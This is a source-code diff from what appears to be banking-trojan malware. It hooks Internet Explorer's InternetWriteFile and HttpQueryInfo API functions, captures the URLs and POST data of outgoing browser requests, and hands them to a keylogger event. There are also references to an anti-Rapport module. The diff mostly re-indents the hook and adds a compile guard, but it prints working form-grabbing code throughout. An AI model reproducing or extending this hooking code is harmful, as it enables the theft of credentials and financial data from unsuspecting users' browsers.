@@ -1213,24 +1213,24 @@ BOOL WINAPI HOOK_HttpQueryInfoW(HINTERNET hRequest, DWORD dwInfoLevel,
 
 
 #ifdef UniversalKeyLoggerH
-BOOL WINAPI HOOK_InternetWriteFile(HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten )
-{
-	// Вызываем событие кейлогера
-	THTTPRequestData Data;
-	ClearStruct(Data);
+	BOOL WINAPI HOOK_InternetWriteFile(HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten )
+	{
+		// Вызываем событие кейлогера
+		THTTPRequestData Data;
+		ClearStruct(Data);
 
-	Data.Browser      = BrowserIE;
-	Data.Handle       = hFile;
-	Data.URL          = GetInetOption(hFile, INTERNET_OPTION_URL);
-	Data.PostData     = (PCHAR)lpBuffer;
-	Data.PostDataSize = dwNumberOfBytesToWrite;
+		Data.Browser      = BrowserIE;
+		Data.Handle       = hFile;
+		Data.URL          = GetInetOption(hFile, INTERNET_OPTION_URL);
+		Data.PostData     = (PCHAR)lpBuffer;
+		Data.PostDataSize = dwNumberOfBytesToWrite;
 
-	KeyLogger::CallEvent(KLE_INTERNET_WRITE_FILE, &Data);
+		KeyLogger::CallEvent(KLE_INTERNET_WRITE_FILE, &Data);
 
-	STR::Free(Data.URL);
+		STR::Free(Data.URL);
 
-	return REAL_InternetWriteFile( hFile, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten );
-}
+		return REAL_InternetWriteFile( hFile, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten );
+	}
 #endif
 // ----------------------------------------------------------------------------
 
@@ -1432,6 +1432,7 @@ bool HookInternetExplorerApi() {
 	// HookInternetExplorerApi - функция вешает хуки на интернет API
 	// которые использует интернет експлорер для загрузки страниц
 
+
 	IEDBG("Перехват функций WinAPI");
 
 	#ifdef antirapportH
@@ -1542,8 +1543,9 @@ bool HookInternetExplorerApi() {
 		__asm mov[REAL_HttpQueryInfoW], eax
 	}
 
-
-	#ifdef UniversalKeyLoggerH
+	// Перехват функции делаем только при включенном кейлогере и отключенном
+	// модуле BSS
+	#if defined(UniversalKeyLoggerH) && !defined(BSSH)
 	if ( HookApi( 8, Hash_InternetWriteFile, &HOOK_InternetWriteFile ) )
 	{
 		__asm mov [REAL_InternetWriteFile], eax
